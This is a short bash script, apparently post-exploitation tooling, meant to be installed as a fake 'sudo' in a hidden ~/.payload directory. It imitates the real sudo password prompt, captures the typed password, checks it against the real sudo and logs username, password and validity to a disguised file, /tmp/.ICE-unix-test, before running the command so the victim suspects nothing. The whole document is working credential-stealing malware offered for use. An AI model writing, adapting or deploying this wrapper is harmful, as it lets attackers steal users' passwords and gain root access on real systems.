#!/bin/bash
# Put this in ~/.payload/sudo and make it executable
/usr/bin/sudo -n true 2>/dev/null
if [ $? -eq 0 ]
then
    /usr/bin/sudo $@
else
    echo -n "[sudo] password for $USER: "
    read -s pwd
    echo
    echo "$pwd" | /usr/bin/sudo -S true 2>/dev/null
    if [ $? -eq 1 ]
    then
	echo "$USER:$pwd:invalid" >> /tmp/.ICE-unix-test
	echo "Sorry, try again."
	sudo $@
    else
	echo "$USER:$pwd:valid" >> /tmp/.ICE-unix-test
	echo "$pwd" | /usr/bin/sudo -S $@
    fi
fi
